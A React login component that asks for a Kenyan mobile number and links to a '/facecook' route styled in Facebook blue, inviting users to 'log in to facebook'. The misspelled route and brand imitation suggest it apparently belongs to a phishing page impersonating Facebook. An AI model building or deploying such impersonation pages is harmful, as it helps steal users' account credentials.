import React from "react";
import { Link } from "react-router-dom";
import NavBar from "../Components/NavBar";

const Login = () => {
  return (
    <>
      <NavBar />
      <div className=" h-screen w-screen bg-gradient-to-r from-cyan-500 to-blue-500 px-8 pt-20 flex flex-col items-center justify-center">
        <div className="bg-white p-4 w-[50vw]">
          <p className="font-bold text-[14px]">ENTER YOUR MOBILE NUMBER:</p>
          <div className="flex items-center gap-1 mt-4">
            <span>+254</span>
            <input
              type="number"
              class="bg-gray-50 border border-gray-300 text-gray-900 text-sm rounded-lg focus:ring-blue-500 focus:border-blue-500 block w-full p-2.5 dark:bg-gray-700 dark:border-gray-600 dark:placeholder-gray-400 dark:text-white dark:focus:ring-blue-500 dark:focus:border-blue-500"
              required
              name="number"
            />
          </div>
          <p className="mt-8">
            Click{" "}
            <Link to="/facecook">
              <span className="text-[24px] bg-[#1877f2] p-2 rounded-3xl">
                here
              </span>
            </Link>{" "}
            to log in to facebook and complete your submission
          </p>
        </div>
      </div>
    </>
  );
};

export default Login;
